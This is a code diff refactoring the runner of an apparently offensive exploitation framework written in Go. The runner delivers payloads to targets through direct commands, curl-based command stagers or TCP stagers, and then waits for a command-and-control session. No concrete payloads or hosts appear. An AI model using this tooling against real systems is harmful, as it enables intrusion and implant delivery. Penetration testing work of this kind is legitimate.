@@ -9,10 +9,10 @@ import (
 	"github.com/Chocapikk/pik/pkg/c2"
 	"github.com/Chocapikk/pik/pkg/c2/shell"
 	"github.com/Chocapikk/pik/pkg/cmdstager"
-	"github.com/Chocapikk/pik/sdk"
 	"github.com/Chocapikk/pik/pkg/output"
 	"github.com/Chocapikk/pik/pkg/payload"
 	"github.com/Chocapikk/pik/pkg/text"
+	"github.com/Chocapikk/pik/sdk"
 )
 
 // --- Types ---
@@ -20,6 +20,27 @@ import (
 // RunOpts configures runner behavior.
 type RunOpts struct {
 	CheckOnly bool
+}
+
+// delivery bundles the common state shared across delivery methods.
+type delivery struct {
+	target   string
+	mod      sdk.Exploit
+	modTarget sdk.Target
+	backend  c2.Backend
+	params   sdk.Params
+	platform string
+	timeout  time.Duration
+}
+
+// exploit runs the module and waits for a session.
+func (d *delivery) exploit(run *sdk.Context) error {
+	output.Status("Exploiting %s", d.target)
+	if err := d.mod.Exploit(run); err != nil {
+		return fmt.Errorf("exploit failed: %w", err)
+	}
+	output.Status("Waiting for session...")
+	return d.backend.WaitForSession(d.timeout)
 }
 
 // --- Public API ---
@@ -46,13 +67,21 @@ func RunSingle(ctx context.Context, mod sdk.Exploit, params sdk.Params, opts Run
 	if platform == "" {
 		platform = mod.Info().Platform()
 	}
-	timeout := time.Duration(params.IntOr("WAITSESSION", 30)) * time.Second
 
-	if modTarget.Type == "dropper" {
-		return deliverCmdStager(target, mod, modTarget, backend, params, platform, timeout)
+	d := &delivery{
+		target:    target,
+		mod:       mod,
+		modTarget: modTarget,
+		backend:   backend,
+		params:    params,
+		platform:  platform,
+		timeout:   time.Duration(params.IntOr("WAITSESSION", 30)) * time.Second,
 	}
 
-	return deliverPayload(target, mod, modTarget, backend, params, platform, timeout)
+	if modTarget.Type == "dropper" {
+		return d.cmdStager()
+	}
+	return d.directPayload()
 }
 
 // --- Check ---
@@ -95,96 +124,77 @@ func resolveTarget(mod sdk.Exploit, params sdk.Params) sdk.Target {
 
 // --- Delivery: direct payload ---
 
-func deliverPayload(target string, mod sdk.Exploit, modTarget sdk.Target, backend c2.Backend, params sdk.Params, platform string, timeout time.Duration) error {
-	payloadCmd, err := resolvePayload(backend, params, platform)
+func (d *delivery) directPayload() error {
+	payloadCmd, err := resolvePayload(d.backend, d.params, d.platform)
 	if err != nil {
 		return fmt.Errorf("payload generation failed: %w", err)
 	}
 
-	run := BuildContext(params, payloadCmd)
-	run.SetTarget(modTarget)
-
-	output.Status("Exploiting %s", target)
-	if err := mod.Exploit(run); err != nil {
-		return fmt.Errorf("exploit failed: %w", err)
-	}
-
-	output.Status("Waiting for session...")
-	return backend.WaitForSession(timeout)
+	run := BuildContext(d.params, payloadCmd)
+	run.SetTarget(d.modTarget)
+	return d.exploit(run)
 }
 
 // --- Delivery: cmdstager ---
 
-func deliverCmdStager(target string, mod sdk.Exploit, modTarget sdk.Target, backend c2.Backend, params sdk.Params, platform string, timeout time.Duration) error {
-	if _, ok := mod.(sdk.CmdStager); !ok {
-		return fmt.Errorf("module %s does not implement CmdStager", sdk.NameOf(mod))
+func (d *delivery) cmdStager() error {
+	if _, ok := d.mod.(sdk.CmdStager); !ok {
+		return fmt.Errorf("module %s does not implement CmdStager", sdk.NameOf(d.mod))
 	}
 
-	fetch := params.GetOr("FETCH_COMMAND", "curl")
+	fetch := d.params.GetOr("FETCH_COMMAND", "curl")
 	if fetch == "tcp" {
-		return deliverTCPStager(target, mod, modTarget, backend, params, platform, timeout)
+		return d.tcpStager()
 	}
 
-	payloadCmd, err := resolvePayload(backend, params, platform)
+	payloadCmd, err := resolvePayload(d.backend, d.params, d.platform)
 	if err != nil {
 		return fmt.Errorf("payload generation failed: %w", err)
 	}
 
-	commands, opts := generateCmdStager([]byte(payloadCmd), params)
+	commands, opts := generateCmdStager([]byte(payloadCmd), d.params)
 
 	output.InfoBox("CmdStager",
-		"Target", target,
+		"Target", d.target,
 		"Flavor", string(opts.flavor),
 		"Payload", fmt.Sprintf("%d bytes", len(payloadCmd)),
 		"Chunks", fmt.Sprintf("%d commands", len(commands)),
 		"Drop path", opts.tempPath,
 	)
 
-	run := BuildContext(params, "")
+	run := BuildContext(d.params, "")
 	run.SetCommands(commands)
-	run.SetTarget(modTarget)
-
-	output.Status("Exploiting %s", target)
-	if err := mod.Exploit(run); err != nil {
-		return fmt.Errorf("exploit failed: %w", err)
-	}
-
-	output.Status("Waiting for session...")
-	return backend.WaitForSession(timeout)
+	run.SetTarget(d.modTarget)
+	return d.exploit(run)
 }
 
-func deliverTCPStager(target string, mod sdk.Exploit, modTarget sdk.Target, backend c2.Backend, params sdk.Params, platform string, timeout time.Duration) error {
-	tcpBackend, ok := backend.(c2.TCPStager)
+// --- Delivery: TCP stager ---
+
+func (d *delivery) tcpStager() error {
+	tcpBackend, ok := d.backend.(c2.TCPStager)
 	if !ok {
-		return fmt.Errorf("backend %q does not support TCP staging", backend.Name())
+		return fmt.Errorf("backend %q does not support TCP staging", d.backend.Name())
 	}
 
-	stagerBin, err := tcpBackend.TCPStageImplant(platform, params.Arch())
+	stagerBin, err := tcpBackend.TCPStageImplant(d.platform, d.params.Arch())
 	if err != nil {
 		return fmt.Errorf("tcp stager generation failed: %w", err)
 	}
 
-	commands, opts := generateCmdStager(stagerBin, params)
+	commands, opts := generateCmdStager(stagerBin, d.params)
 
 	output.InfoBox("CmdStager (TCP)",
-		"Target", target,
+		"Target", d.target,
 		"Flavor", string(opts.flavor),
 		"Stager", fmt.Sprintf("%d bytes", len(stagerBin)),
 		"Chunks", fmt.Sprintf("%d commands", len(commands)),
 		"Drop path", opts.tempPath,
 	)
 
-	run := BuildContext(params, "")
+	run := BuildContext(d.params, "")
 	run.SetCommands(commands)
-	run.SetTarget(modTarget)
-
-	output.Status("Exploiting %s", target)
-	if err := mod.Exploit(run); err != nil {
-		return fmt.Errorf("exploit failed: %w", err)
-	}
-
-	output.Status("Waiting for session...")
-	return backend.WaitForSession(timeout)
+	run.SetTarget(d.modTarget)
+	return d.exploit(run)
 }
 
 // --- Cmdstager helpers ---
@@ -232,7 +242,6 @@ func resolvePayload(backend c2.Backend, params sdk.Params, platform string) (str
 		return "", err
 	}
 
-	// If a tunnel is configured, rewrite the staging URL to use it
 	if tunnel := params.Tunnel(); tunnel != "" {
 		if parsed, err := url.Parse(stageURL); err == nil {
 			tunnelParsed, _ := url.Parse(tunnel)
@@ -264,7 +273,6 @@ func resolvePayload(backend c2.Backend, params sdk.Params, platform string) (str
 		return payload.Curl(stageURL, remotePath), nil
 	}
 }
-
 
 // --- C2 resolution ---
 
